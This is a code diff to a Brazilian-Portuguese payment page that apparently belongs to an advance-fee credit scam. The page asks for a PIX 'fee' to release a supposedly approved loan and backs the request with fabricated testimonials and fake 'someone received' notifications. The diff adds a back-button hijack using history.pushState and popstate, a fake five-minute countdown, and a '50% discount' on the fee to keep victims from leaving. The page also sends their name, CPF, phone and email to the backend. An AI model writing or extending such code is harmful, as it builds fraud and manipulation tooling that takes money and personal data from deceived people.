@@ -51,6 +51,19 @@ textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-s
 .notif-txt b{color:#222}
 .notif-txt .valor-n{color:#0a7d3b;font-weight:800}
 .notif-txt .tempo{font-size:10px;color:#999;display:block;margin-top:2px}
+.exit-offer{position:fixed;inset:0;z-index:2000;background:rgba(34,10,50,.72);display:none;align-items:center;justify-content:center;padding:20px}
+.exit-offer.show{display:flex}
+.exit-box{width:100%;max-width:400px;background:#fff;border-radius:18px;padding:24px;text-align:center;box-shadow:0 12px 40px rgba(0,0,0,.28)}
+.exit-icon{width:52px;height:52px;margin:0 auto 12px;border-radius:50%;background:#f4ecfa;color:#820ad1;display:flex;align-items:center;justify-content:center;font-size:27px;font-weight:800}
+.exit-box h2{font-size:22px;color:#222;margin-bottom:8px}
+.exit-box p{font-size:14px;line-height:1.5;color:#555}
+.exit-price{margin:14px 0 5px;font-size:15px;color:#777}
+.exit-price del{margin-right:8px}
+.exit-price strong{display:block;color:#820ad1;font-size:34px;margin-top:2px}
+.exit-count{margin:14px 0;background:#f4ecfa;border-radius:12px;padding:11px;color:#555;font-size:12px}
+.exit-count b{display:block;color:#820ad1;font-size:28px}
+.exit-stay{margin-top:0}
+.exit-leave{display:inline-block;margin-top:14px;border:0;background:transparent;color:#777;text-decoration:underline;font-size:13px;cursor:pointer}
 
 </style>
 </head>
@@ -89,12 +102,23 @@ textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-s
 <div class="fb"><div class="fb-top"><img class="avatar" src="https://randomuser.me/api/portraits/women/68.jpg" alt="Amanda Costa" loading="lazy"><div><div class="fb-nome">Amanda Costa</div><div class="fb-data">ontem · Salvador/BA</div></div></div><div class="stars">★★★★☆</div><div class="fb-txt">Demorou algumas horas pra cair, mas caiu certinho. Site confiável, pode pagar sem medo.</div><span class="fb-valor">Recebeu R$ 5.000,00</span><span class="fb-verif">✓ Compra verificada</span></div>
 </div>
 <div class="notif" id="notif"><img id="notifImg" src="" alt=""><div class="notif-txt" id="notifTxt"></div></div>
+<div class="exit-offer" id="exitOffer" role="dialog" aria-modal="true" aria-labelledby="exitTitle">
+<div class="exit-box">
+<div class="exit-icon">!</div>
+<h2 id="exitTitle">Seu valor está reservado</h2>
+<p>Não saia desta página. Liberamos uma condição especial de 50% na taxa para você concluir agora.</p>
+<div class="exit-price"><del>R$ 28,63</del><strong>R$ 14,32</strong></div>
+<div class="exit-count">Esta condição termina em:<b id="exitCd">05:00</b></div>
+<button class="btn exit-stay" id="acceptOffer" type="button">APROVEITAR 50% DE DESCONTO</button>
+<button class="exit-leave" id="leavePage" type="button">Não quero o desconto, sair</button>
+</div></div>
 <script>
 (function(){
   var ls=function(k){try{return localStorage.getItem(k)||""}catch(e){return""}};
   var qs=new URLSearchParams(location.search);
   var utms={};['utm_source','utm_campaign','utm_medium','utm_content','utm_term'].forEach(function(k){var v=ls(k)||qs.get(k);if(v)utms[k]=v;});
   var st=document.getElementById('status');
+  var currentAmount='28,63',pollTimer=null;
   var vAp=ls('creditoAprovado')||ls('creditoSolicitado')||'7.584,00';
   if(vAp.indexOf('R$')===-1)vAp='R$ '+vAp;
   document.getElementById('valorAp').textContent=vAp;
@@ -114,9 +138,10 @@ textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-s
   }
   function poll(id){
     st.textContent='Aguardando pagamento...';
-    var iv=setInterval(function(){
+    if(pollTimer)clearInterval(pollTimer);
+    pollTimer=setInterval(function(){
       fetch('/api/check_status/?txid='+encodeURIComponent(id)).then(function(r){return r.json()}).then(function(d){
-        if(d.paid){clearInterval(iv);st.textContent='Pagamento confirmado! Redirecionando...';st.style.color='green';setTimeout(next,2000);}
+        if(d.paid){clearInterval(pollTimer);st.textContent='Pagamento confirmado! Redirecionando...';st.style.color='green';setTimeout(next,2000);}
       }).catch(function(){});
     },4000);
   }
@@ -124,8 +149,8 @@ textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-s
     var saved=null;try{saved=JSON.parse(sessionStorage.getItem('pix_pag04')||'null')}catch(e){}
     if(saved&&saved.qr&&Date.now()-saved.at<25*60*1000){show(saved.qr,saved.id);return;}
     fetch('/api/backend/',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({
-      amount:'28,63',nome:ls('nomeUsuario')||ls('name')||ls('nome'),cpf:(ls('cpfUsuario')||ls('cpf')||ls('document')).replace(/\D/g,''),
-      telefone:(ls('telephone')||ls('phone')).replace(/\D/g,''),email:ls('email'),stage:'avaliacao04'},utms))})
+      amount:currentAmount,nome:ls('nomeUsuario')||ls('name')||ls('nome'),cpf:(ls('cpfUsuario')||ls('cpf')||ls('document')).replace(/\D/g,''),
+      telefone:(ls('telephone')||ls('phone')).replace(/\D/g,''),email:ls('email'),stage:currentAmount==='14,32'?'avaliacao04_backoffer':'avaliacao04'},utms))})
     .then(function(r){return r.json().then(function(d){return{ok:r.ok,d:d}})}).then(function(x){
       var d=x.d;var qr=d.qr_code||d.qrcode||(d.pix&&d.pix.qrcode)||(d.data&&d.data.pix&&d.data.pix.qr_code);var id=d.txid||d.id||(d.data&&d.data.id);
       if(!x.ok||!qr)throw new Error('falha');
@@ -138,6 +163,28 @@ textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-s
     document.getElementById('code').value=qr;
     if(id)poll(id);
   }
+
+  // oferta transparente ao tentar voltar
+  var exitOffer=document.getElementById('exitOffer'),exitCd=document.getElementById('exitCd');
+  var offerShown=false,allowExit=false,offerTime=300,offerTimer=null;
+  try{history.pushState({pagamento04:true},'',location.href)}catch(e){}
+  function updateOfferTime(){
+    exitCd.textContent=String(Math.floor(offerTime/60)).padStart(2,'0')+':'+String(offerTime%60).padStart(2,'0');
+  }
+  function showExitOffer(){
+    if(allowExit)return;
+    exitOffer.classList.add('show');offerShown=true;updateOfferTime();
+    if(!offerTimer)offerTimer=setInterval(function(){if(offerTime>0){offerTime--;updateOfferTime();}},1000);
+  }
+  window.addEventListener('popstate',function(){if(!allowExit){showExitOffer();try{history.pushState({pagamento04:true},'',location.href)}catch(e){}}});
+  document.getElementById('acceptOffer').onclick=function(){
+    currentAmount='14,32';document.querySelector('.taxa').textContent='R$ 14,32';
+    exitOffer.classList.remove('show');t=300;cd.textContent='05:00';
+    try{sessionStorage.removeItem('pix_pag04')}catch(e){}
+    if(pollTimer)clearInterval(pollTimer);
+    document.getElementById('qr').textContent='Gerando PIX com desconto...';document.getElementById('code').value='';st.textContent='';st.style.color='';gerar();
+  };
+  document.getElementById('leavePage').onclick=function(){allowExit=true;history.go(-2);};
 
   // notificacao "fulano recebeu"
   var pessoas=[
